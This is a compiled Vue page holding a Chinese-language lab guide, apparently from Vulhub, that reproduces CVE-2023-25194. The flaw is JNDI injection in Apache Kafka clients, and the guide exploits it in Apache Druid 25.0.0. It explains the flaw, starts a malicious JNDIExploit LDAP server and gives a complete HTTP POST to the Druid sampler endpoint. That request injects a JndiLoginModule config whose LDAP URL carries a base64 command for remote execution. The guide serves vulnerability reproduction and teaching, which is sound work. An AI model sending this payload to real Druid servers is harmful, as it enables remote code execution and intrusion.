import{_ as o}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as u,c as l,a as e,b as i,d as t,e as a}from"./app-58e4a7d6.js";const d={},r=a('<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Apache Kafka是一个开源分布式消息队列，Kafka clients是相对应的Java客户端。</p><p>在版本3.4.0以前，Apache Kafka clients中存在一处JNDI注入漏洞。如果攻击者在连接的时候可以控制属性<code>sasl.jaas.config</code>的值为<code>com.sun.security.auth.module.JndiLoginModule</code>，则可以发起JNDI连接，进而导致JNDI注入漏洞，执行任意命令。</p><p>由于这个漏洞是存在于Java库kafka-clients中，所以我们需要在真实环境下找到使用了这个库的软件，且用户可以控制连接参数。</p><p>这个软件就是Apache Druid，其使用kafka-clients来连接Kafka作为其数据源之一。这篇指南就来演示如何利用CVE-2023-25194来攻击Apache Druid。</p><p>参考链接：</p>',6),c={href:"https://nvd.nist.gov/vuln/detail/CVE-2023-25194",target:"_blank",rel:"noopener noreferrer"},v={href:"https://github.com/projectdiscovery/nuclei-templates/blob/5d90e8275084b0ae9166ec38cacd22e5a5a94fb8/http/vulnerabilities/apache/apache-druid-kafka-connect-rce.yaml",target:"_blank",rel:"noopener noreferrer"},p={href:"https://hackerone.com/reports/1529790",target:"_blank",rel:"noopener noreferrer"},m=a(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个Apache Druid 25.0.0服务，其内部使用的kafka-clients版本是3.3.1：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，访问<code>http://your-ip:8888</code>即可查看到Apache Druid主页。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504090355040.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,6),b={href:"https://github.com/vulhub/JNDIExploit",target:"_blank",rel:"noopener noreferrer"},q=a(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&gt;java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.174.1 -u
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504095808945.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这个工具给出了很多利用方法，我们使用<code>ldap://your-jndi-server:1389/Basic/Command/Base64/[base64_encoded_cmd]</code>，将命令<code>id &gt; /tmp/success</code>编码后放在URL中。</p><p>将这个恶意LDAP URL放在下面这个请求中，并发送：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: your-ip:8888
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 1792

{
    &quot;type&quot;:&quot;kafka&quot;,
    &quot;spec&quot;:{
        &quot;type&quot;:&quot;kafka&quot;,
        &quot;ioConfig&quot;:{
            &quot;type&quot;:&quot;kafka&quot;,
            &quot;consumerProperties&quot;:{
                &quot;bootstrap.servers&quot;:&quot;127.0.0.1:6666&quot;,
                &quot;sasl.mechanism&quot;:&quot;SCRAM-SHA-256&quot;,
                &quot;security.protocol&quot;:&quot;SASL_SSL&quot;,
                &quot;sasl.jaas.config&quot;:&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=\\&quot;ldap://your-jndi-server:1389/Basic/Command/base64/aWQgPiAvdG1wL3N1Y2Nlc3M=\\&quot; useFirstPass=\\&quot;true\\&quot; serviceName=\\&quot;x\\&quot; debug=\\&quot;true\\&quot; group.provider.url=\\&quot;xxx\\&quot;;&quot;
            },
            &quot;topic&quot;:&quot;test&quot;,
            &quot;useEarliestOffset&quot;:true,
            &quot;inputFormat&quot;:{
                &quot;type&quot;:&quot;regex&quot;,
                &quot;pattern&quot;:&quot;([\\\\s\\\\S]*)&quot;,
                &quot;listDelimiter&quot;:&quot;56616469-6de2-9da4-efb8-8f416e6e6965&quot;,
                &quot;columns&quot;:[
                    &quot;raw&quot;
                ]
            }
        },
        &quot;dataSchema&quot;:{
            &quot;dataSource&quot;:&quot;sample&quot;,
            &quot;timestampSpec&quot;:{
                &quot;column&quot;:&quot;!!!_no_such_column_!!!&quot;,
                &quot;missingValue&quot;:&quot;1970-01-01T00:00:00Z&quot;
            },
            &quot;dimensionsSpec&quot;:{

            },
            &quot;granularitySpec&quot;:{
                &quot;rollup&quot;:false
            }
        },
        &quot;tuningConfig&quot;:{
            &quot;type&quot;:&quot;kafka&quot;
        }
    },
    &quot;samplerConfig&quot;:{
        &quot;numRows&quot;:500,
        &quot;timeoutMs&quot;:15000
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504101720810.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进入容器后可见<code>id &gt; /tmp/success</code>成功执行。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230504101743935.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,8);function h(g,f){const n=s("ExternalLinkIcon");return u(),l("div",null,[r,e("ul",null,[e("li",null,[e("a",c,[i("https://nvd.nist.gov/vuln/detail/CVE-2023-25194"),t(n)])]),e("li",null,[e("a",v,[i("https://github.com/projectdiscovery/nuclei-templates/blob/5d90e8275084b0ae9166ec38cacd22e5a5a94fb8/http/vulnerabilities/apache/apache-druid-kafka-connect-rce.yaml"),t(n)])]),e("li",null,[e("a",p,[i("https://hackerone.com/reports/1529790"),t(n)])])]),m,e("p",null,[i("首先，使用"),e("a",b,[i("JNDIExploit"),t(n)]),i("启动一个恶意的JNDI服务器：")]),q])}const x=o(d,[["render",h],["__file","Apache Kafka Clients LDAP注入漏洞 CVE-2023-25194.html.vue"]]);export{x as default};
